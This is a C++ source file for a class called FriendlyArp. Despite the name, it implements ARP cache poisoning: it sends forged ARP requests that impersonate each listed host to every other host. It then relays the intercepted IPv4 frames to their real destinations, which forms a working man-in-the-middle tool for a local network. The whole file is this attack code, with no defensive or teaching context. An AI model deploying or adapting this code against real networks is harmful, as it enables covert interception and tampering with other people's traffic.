#include "FriendlyArp.hpp"
#include "ARP.hpp"
#include "Ethernet.hpp"
#include "CliHelper.hpp"
#include <iostream>

const int MIN_IP_FRAME = 34;

FriendlyArp::FriendlyArp(   const std::map<uint32_t, MacAddress>& arp_mapper, 
                            MacAddress local_mac, 
                            uint32_t local_ip,
                            pcap_t* handle) : 
                            arp_cache(arp_mapper), 
                            local_mac(local_mac), 
                            local_ip(local_ip),
                            pcap_handle(handle)
{ }

void FriendlyArp::send_arp_injections(std::vector<uint32_t> ip_addrs)
{
    for (uint32_t ip_addr_1 : ip_addrs)
    {
        for (uint32_t ip_addr_2 : ip_addrs)
        {
            if (ip_addr_1 != ip_addr_2)
            {
                auto entry = arp_cache.find(ip_addr_2);
                if (entry == arp_cache.end()) 
                    continue;

                MacAddress target_mac = entry->second;
                send_arp_injection(ip_addr_1, target_mac, ip_addr_2);
            }
        }
    }
}

bool FriendlyArp::send_arp_injection(   const uint32_t& impersonate_src_ip, const MacAddress& target_mac, 
                                        const uint32_t& target_ip)
{
    std::vector<uint8_t> arp_poisoning;
    ARP::build_arp(arp_poisoning, &local_mac, &impersonate_src_ip,
                    &target_mac, &target_ip, ARP::Opcode::Request);
    
    Ethernet::build_ethernet(arp_poisoning, local_mac, target_mac, 0x0806);
    
    if (pcap_sendpacket(pcap_handle, arp_poisoning.data(), arp_poisoning.size()) != 0) 
    {
        std::cerr << "Failed to send gratuitous ARP: " << pcap_geterr(pcap_handle) << std::endl;
        return false;
    }

    std::cout << "Sent gratuitous ARP to " << CliHelper::ip_to_string(target_ip) << " (impersonating "
              << CliHelper::ip_to_string(impersonate_src_ip) << ")" << std::endl;

    return true;
}

void FriendlyArp::forward_packet(const struct pcap_pkthdr* header, const uint8_t* packet)
{
    if (header->caplen < MIN_IP_FRAME) 
        return; 

    uint32_t dest_ip;
    std::memcpy(&dest_ip, packet + 30, sizeof(dest_ip));

    uint16_t ethertype = ntohs(*(uint16_t*)(packet + 12));

    if (ethertype == static_cast<uint16_t>(Ethernet::Ethertype::IPv4))
    {
        auto it = arp_cache.find(dest_ip);
        if (it == arp_cache.end())
        {
            return; 
        }    
        MacAddress real_dest_mac = it->second;

        std::vector<uint8_t> forward_buffer(packet, packet + header->caplen);

        std::memcpy(forward_buffer.data(), real_dest_mac.data(), ETHER_ADDR_LEN);    
        std::memcpy(forward_buffer.data() + ETHER_ADDR_LEN, local_mac.data(), ETHER_ADDR_LEN);

        if (pcap_sendpacket(pcap_handle, forward_buffer.data(), forward_buffer.size()) != 0)
        {
            std::cerr << "Failed to forward packet: " << pcap_geterr(pcap_handle) << std::endl;
        }
    }
}